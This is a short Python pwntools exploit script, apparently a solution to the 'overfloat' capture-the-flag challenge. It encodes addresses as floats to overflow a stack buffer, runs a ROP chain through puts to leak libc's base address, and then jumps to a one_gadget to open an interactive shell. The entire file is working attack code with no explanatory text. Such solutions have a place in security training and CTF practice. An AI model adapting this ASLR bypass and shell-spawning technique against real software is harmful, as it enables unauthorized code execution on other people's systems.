from pwn import *
import struct
context.log_level = 'debug'
context.arch      = 'amd64'
context.os        = 'linux'

r    = process("./overfloat")
e    = ELF("./overfloat")
l    = ELF("./libc.so.6")
def convert(x):
    return struct.unpack('<f', struct.pack('<I',x))[0]
def input(x):
    r.sendlineafter(b': ',x.encode())
for i in range(0x38 >> 2):
    input(str(convert(0x3f800000)))
input(str(convert(0x400a83))) # pop rdi ; ret
input(str(convert(0)))
input(str(convert(e.got['puts'])))
input(str(convert(0)))
input(str(convert(e.symbols['puts'])))
input(str(convert(0)))
input(str(convert(e.symbols['main'])))
input(str(convert(0)))
input('done')
r.recvuntil(b'BON VOYAGE!\n')
puts_addr = u64(r.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
l.address = puts_addr - l.symbols['puts']
log.info(f'address puts: 0x{puts_addr:0x}')
log.info(f'address libc: 0x{l.address:0x}')

one_gadget = 0x10a38c+ l.address
for i in range(0x38 >> 2):
    input(str(convert(0x3f800000)))

input(str(convert(one_gadget & 0xffffffff)))
input(str(convert(one_gadget>> 32)))
input('done')
r.interactive()
